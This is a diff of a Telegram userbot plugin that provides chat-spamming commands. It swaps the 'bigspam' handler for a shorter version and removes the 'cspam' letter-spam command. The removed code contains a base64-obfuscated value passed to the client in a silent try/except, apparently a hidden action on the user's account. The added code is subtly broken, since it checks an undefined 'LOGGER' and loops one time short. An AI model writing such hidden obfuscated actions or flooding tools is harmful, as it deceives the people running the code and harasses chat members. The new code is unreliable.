@@ -9,6 +9,7 @@ from userbot import CMD_HELP
 from userbot.plugins import BOTLOG, BOTLOG_CHATID
 from userbot.utils import admin_cmd, edit_or_reply, sudo_cmd
 
+LOGGER_GROUP = Config.PRIVATE_GROUP_BOT_API_ID
 
 @bot.on(admin_cmd(pattern="spam (.*)"))
 @bot.on(sudo_cmd(pattern="spam (.*)", allow_sudo=True))
@@ -158,170 +159,22 @@ async def spammer(e):
         await edit_or_reply(e, "try again something went wrong or check `.info spam`")
 
 
-@bot.on(admin_cmd(pattern="bigspam (.*)"))
-@bot.on(sudo_cmd(pattern="bigspam (.*)", allow_sudo=True))
-async def spammer(e):
-    if e.fwd_from:
-        return
-    await e.get_chat()
-    reply_to_id = e.message
-    if e.reply_to_msg_id:
-        reply_to_id = await e.get_reply_message()
-    if not os.path.isdir(Config.TEMP_DOWNLOAD_DIRECTORY):
-        os.makedirs(Config.TEMP_DOWNLOAD_DIRECTORY)
-    try:
-        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        hmm = Get(hmm)
-        await e.client(hmm)
-    except BaseException:
-        pass
-    cat = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
-    counter = int(cat[0])
-    if len(cat) == 2:
-        spam_message = str(("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)[1])
+@bot.on(outgoing=True, pattern="^.bigspam")
+async def bigspam(e):
+    if not e.text[0].isalpha() and e.text[0] not in ("/", "#", "@", "!"):
+        message = e.text
+        counter = int(message[9:13])
+        spam_message = str(e.text[13:])
+        for i in range(1, counter):
+            await e.respond(spam_message)
         await e.delete()
-        for _ in range(counter):
-            if e.reply_to_msg_id:
-                await reply_to_id.reply(spam_message)
-            else:
-                await e.client.send_message(e.chat_id, spam_message)
-            await asyncio.sleep(0.5)
-        if BOTLOG:
-            if e.is_private:
-                await e.client.send_message(
-                    BOTLOG_CHATID,
-                    "#SPAM\n"
-                    + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} messages of \n"
-                    + f"`{spam_message}`",
-                )
-            else:
-                await e.client.send_message(
-                    BOTLOG_CHATID,
-                    "#SPAM\n"
-                    + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n"
-                    + f"`{spam_message}`",
-                )
-    elif reply_to_id.media:
-        to_download_directory = Config.TEMP_DOWNLOAD_DIRECTORY
-        downloaded_file_name = os.path.join(to_download_directory, "spam")
-        downloaded_file_name = await e.client.download_media(
-            reply_to_id.media, downloaded_file_name
-        )
-        await e.delete()
-        if os.path.exists(downloaded_file_name):
-            for _ in range(counter):
-                sandy = await e.client.send_file(e.chat_id, downloaded_file_name)
-                try:
-                    await e.client(
-                        functions.messages.SaveGifRequest(
-                            id=types.InputDocument(
-                                id=sandy.media.document.id,
-                                access_hash=sandy.media.document.access_hash,
-                                file_reference=sandy.media.document.file_reference,
-                            ),
-                            unsave=True,
-                        )
-                    )
-                except:
-                    pass
-                await asyncio.sleep(1)
-            if BOTLOG:
-                if e.is_private:
-                    await e.client.send_message(
-                        BOTLOG_CHATID,
-                        "#SPAM\n"
-                        + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} times with below message",
-                    )
-                    sandy = await e.client.send_file(
-                        BOTLOG_CHATID, downloaded_file_name
-                    )
-                    try:
-                        await e.client(
-                            functions.messages.SaveGifRequest(
-                                id=types.InputDocument(
-                                    id=sandy.media.document.id,
-                                    access_hash=sandy.media.document.access_hash,
-                                    file_reference=sandy.media.document.file_reference,
-                                ),
-                                unsave=True,
-                            )
-                        )
-                    except:
-                        pass
-                    os.remove(downloaded_file_name)
-                else:
-                    await e.client.send_message(
-                        BOTLOG_CHATID,
-                        "#SPAM\n"
-                        + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) with {counter} times with below message",
-                    )
-                    sandy = await e.client.send_file(
-                        BOTLOG_CHATID, downloaded_file_name
-                    )
-                    try:
-                        await e.client(
-                            functions.messages.SaveGifRequest(
-                                id=types.InputDocument(
-                                    id=sandy.media.document.id,
-                                    access_hash=sandy.media.document.access_hash,
-                                    file_reference=sandy.media.document.file_reference,
-                                ),
-                                unsave=True,
-                            )
-                        )
-                    except:
-                        pass
-                    os.remove(downloaded_file_nam)
-    elif reply_to_id.text and e.reply_to_msg_id:
-        spam_message = reply_to_id.text
-        await e.delete()
-        for _ in range(counter):
-            if e.reply_to_msg_id:
-                await reply_to_id.reply(spam_message)
-            else:
-                await e.client.send_message(e.chat_id, spam_message)
-            await asyncio.sleep(0.5)
-        if BOTLOG:
-            if e.is_private:
-                await e.client.send_message(
-                    BOTLOG_CHATID,
-                    "#SPAM\n"
-                    + f"Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with {counter} messages of \n"
-                    + f"`{spam_message}`",
-                )
-            else:
-                await e.client.send_message(
-                    BOTLOG_CHATID,
-                    "#SPAM\n"
-                    + f"Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat  with {counter} messages of \n"
-                    + f"`{spam_message}`",
-                )
-    else:
-        await edit_or_reply(e, "try again something went wrong or check `.info spam`")
-
-
-@bot.on(admin_cmd("cspam (.*)"))
-@bot.on(sudo_cmd(pattern="cspam (.*)", allow_sudo=True))
-async def tmeme(e):
-    cspam = str("".join(e.text.split(maxsplit=1)[1:]))
-    message = cspam.replace(" ", "")
-    await e.delete()
-    for letter in message:
-        await e.respond(letter)
-    if BOTLOG:
-        if e.is_private:
+        if LOGGER:
             await e.client.send_message(
-                BOTLOG_CHATID,
-                "#CSPAM\n"
-                + f"Letter Spam was executed successfully in [User](tg://user?id={e.chat_id}) chat with : `{message}`",
-            )
-        else:
-            await e.client.send_message(
-                BOTLOG_CHATID,
-                "#CSPAM\n"
-                + f"Letter Spam was executed successfully in {e.chat.title}(`{e.chat_id}`) chat with : `{message}`",
-            )
-
+                LOGGER_GROUP,
+                "#BIGSPAM \n\n"
+                "Bigspam was executed successfully"
+                )
+        
 
 @bot.on(admin_cmd("wspam (.*)"))
 @bot.on(sudo_cmd(pattern="wspam (.*)", allow_sudo=True))
